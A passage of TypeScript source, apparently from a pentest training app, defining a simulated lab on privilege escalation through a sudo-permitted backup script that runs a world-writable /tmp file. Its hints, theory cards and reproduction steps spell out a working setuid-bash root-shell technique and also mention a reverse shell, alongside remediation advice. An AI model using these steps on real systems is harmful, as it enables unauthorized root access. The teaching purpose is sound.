echo "[+] Backup completed: $BACKUP_FILE"
echo "[*] Running post-backup verification script..."

# Run verification if available
if [ -f "/tmp/verify-backup.sh" ]; then
    bash /tmp/verify-backup.sh
fi`,
      stateChange: ['analyzed_script', 'found_external_source'],
      triggersTheory: 'sudo_script_analysis'
    },
    {
      match: /echo.*>.*\/tmp\/verify-backup\.sh/i,
      output: `(output written to /tmp/verify-backup.sh)`,
      stateChange: ['created_exploit_script']
    },
    {
      match: /sudo\s+\/usr\/local\/bin\/backup-site\.sh/i,
      output: `[*] Starting backup of /var/www/html
[+] Backup completed: /var/backups/website/backup_20250106_152341.tar.gz
[*] Running post-backup verification script...
root@web-server-01:~#

# (simulated root shell - privilege escalation successful)`,
      stateChange: ['privilege_escalation_confirmed'],
      triggersTheory: 'sudo_privilege_escalation'
    }
  ],
  
  clues: [
    'sudo NOPASSWD on backup-site.sh',
    'Script runs with (ALL : ALL) privileges',
    'Script sources external file from /tmp',
    '/tmp is world-writable',
    'No input validation on external script path'
  ],
  
  expectedFlow: [
    'Review sudo -l output',
    'Identify NOPASSWD permission on backup-site.sh',
    'Analyze backup-site.sh source code',
    'Spot external script sourcing from /tmp',
    'Verify /tmp is writable',
    'Create malicious /tmp/verify-backup.sh',
    'Execute backup script with sudo',
    'Confirm root shell access'
  ],
  
  commonMistakes: [
    'Missing the external script sourcing at end of backup-site.sh',
    'Trying to modify backup-site.sh directly (not writable)',
    'Not checking /tmp permissions',
    'Weak proof of concept in finding (just describing, not showing execution)',
    'Conflating sudo misconfiguration with script vulnerability'
  ],
  
  hints: [
    {
      tier: 1,
      text: 'The sudo permission allows running backup-site.sh as root. Carefully analyze what the script does - especially near the end.',
      pointsCost: 2
    },
    {
      tier: 2,
      text: 'The backup script checks for and executes an external file if it exists. Consider where that file would need to be located and whether you can write there.',
      pointsCost: 5
    },
    {
      tier: 3,
      text: 'Create /tmp/verify-backup.sh with a reverse shell or "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash". Then run: sudo /usr/local/bin/backup-site.sh',
      pointsCost: 10
    }
  ],
  
  theoryCards: [
    {
      id: 'sudo_script_analysis',
      title: 'Analyzing Sudo-Permitted Scripts',
      trigger: 'analyzed_script',
      whatThisIs: 'When sudo permissions allow running a specific script, the script effectively runs with elevated privileges. Any vulnerabilities in that script - command injection, external file sourcing, writable paths - become privilege escalation vectors.',
      whyItMatters: 'Administrators often grant sudo access to "safe" automation scripts. If those scripts call other scripts, use relative paths, accept input, or source external files, they can be exploited for privilege escalation.',
      pentestReflex: 'Always read sudo-permitted scripts completely. Look for: external script sourcing, command execution with variables, relative paths, /tmp usage, user-writable locations. Test if you can control any execution path.',
      commonMisunderstanding: 'Operators often stop at finding sudo permissions without analyzing what the script actually does. The vulnerability is usually IN the script, not just the sudo permission itself.',
      syntaxExample: `# Read sudo-permitted script
cat /usr/local/bin/backup-site.sh

# Check for external calls
grep -E "source|bash|sh|exec|eval|system" /usr/local/bin/backup-site.sh

# Check if script location is writable
ls -la /usr/local/bin/backup-site.sh

# Check if called files are writable
ls -la /tmp/verify-backup.sh`
    },
    {
      id: 'sudo_privilege_escalation',
      title: 'Sudo Misconfiguration Exploitation',
      trigger: 'privilege_escalation_confirmed',
      whatThisIs: 'Successful privilege escalation via sudo misconfiguration. The backup script ran with root privileges and executed your malicious /tmp/verify-backup.sh, granting a root shell.',
      whyItMatters: 'This is a common real-world vulnerability pattern. Many organizations use sudo to delegate specific administrative tasks, but fail to secure the scripts themselves. A single sudo-permitted script with poor validation can lead to full system compromise.',
      pentestReflex: 'Always enumerate sudo permissions immediately after gaining initial access. sudo -l should be in your first 5 commands. If you find sudo-permitted scripts, read them completely before attempting exploitation.',
      commonMisunderstanding: 'Many operators think sudo is secure by design. In reality, sudo is only as secure as the scripts it permits. Always analyze the full execution chain.',
      syntaxExample: `# Exploitation steps
echo '#!/bin/bash' > /tmp/verify-backup.sh
echo 'cp /bin/bash /tmp/rootbash' >> /tmp/verify-backup.sh
echo 'chmod +s /tmp/rootbash' >> /tmp/verify-backup.sh
chmod +x /tmp/verify-backup.sh

# Execute with sudo
sudo /usr/local/bin/backup-site.sh

# Get root shell
/tmp/rootbash -p`
    }
  ],
  
  successConditions: [
    'reviewed_sudo_perms',
    'analyzed_script',
    'found_external_source',
    'created_exploit_script',
    'privilege_escalation_confirmed'
  ],
  
  expectedFinding: {
    title: 'Privilege Escalation via Sudo-Permitted Script Vulnerability',
    severity: 'high',
    cvss: 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (7.8)',
    description: 'The user "webdev" has sudo permissions to execute /usr/local/bin/backup-site.sh with NOPASSWD. The backup script contains a vulnerability where it sources an external file (/tmp/verify-backup.sh) without validation. Since /tmp is world-writable, an attacker with low-privilege access can create a malicious verification script that executes with root privileges.',
    impact: 'An attacker with access to the webdev account can escalate privileges to root by creating a malicious /tmp/verify-backup.sh file and executing the backup script with sudo. This grants full system control, enabling data exfiltration, persistence installation, lateral movement, and complete infrastructure compromise.',
    evidence: [
      'sudo -l output shows: (ALL : ALL) NOPASSWD: /usr/local/bin/backup-site.sh',
      'backup-site.sh line 25: sources /tmp/verify-backup.sh without validation',
      '/tmp directory is world-writable (drwxrwxrwt)',
      'Successful privilege escalation confirmed: webdev → root'
    ],
    reproductionSteps: [
      'Authenticate as webdev user',
      'Create malicious script: echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /tmp/verify-backup.sh',
      'Make script executable: chmod +x /tmp/verify-backup.sh',
      'Execute with sudo: sudo /usr/local/bin/backup-site.sh',
      'Spawn root shell: /tmp/rootbash -p',
      'Verify: id (observe uid=0(root))'
    ],
    remediation: 'Immediately revoke sudo permissions or fix the script: (1) Remove NOPASSWD from sudoers or restrict to specific safe commands, (2) Remove external script sourcing from backup-site.sh, or validate file ownership/permissions before sourcing, (3) Use absolute paths and avoid /tmp for sensitive operations, (4) Implement input validation and secure coding practices in all sudo-permitted scripts, (5) Audit all other sudo rules for similar vulnerabilities, (6) Consider using sudo security features like secure_path and env_reset properly.'
  },
  
  reflectionPrompts: [
    {
      question: 'What in the sudo -l output indicated this was worth investigating deeper than just "can run a backup script"?',
      purpose: 'Tests understanding of sudo permission analysis'
    },
    {
      question: 'At what point in reading backup-site.sh did you recognize the privilege escalation vector?',
      purpose: 'Calibrates script analysis pattern recognition'
    },
    {
      question: 'How would you explain the difference between "sudo permission" and "script vulnerability" to a developer who wrote this script?',
      purpose: 'Trains clear articulation of compound vulnerabilities'
    }
  ],
  
  scoringRubric: {
    completion: 30,
    methodology: 20,
    signalRecognition: 15,
    efficiency: 10,
    reporting: 20,
    reflection: 5,
    total: 100
  },
  
  variationIdeas: [
    'Different script types (Python, Perl instead of bash)',
    'Alternate vulnerabilities (command injection, PATH hijacking, symlink attacks)',
    'Different writable locations (/opt/scripts/, /usr/local/share/)'
  ]
};

// ============================================
// LIBRARY EXPORT
// ============================================

export const CASEFILE_LIBRARY: Casefile[] = [
  caseHostHeader,
  caseForgottenArchive,
  caseSudoMisconfig
];

export function getCasefileById(id: string): Casefile | undefined {
  return CASEFILE_LIBRARY.find(c => c.id === id);
}

export function getCasefilesByCategory(category: CasefileCategory): Casefile[] {
  return CASEFILE_LIBRARY.filter(c => c.category === category);
}

export function getCasefilesByDifficulty(difficulty: CasefileDifficulty): Casefile[] {
  return CASEFILE_LIBRARY.filter(c => c.difficulty === difficulty);
}
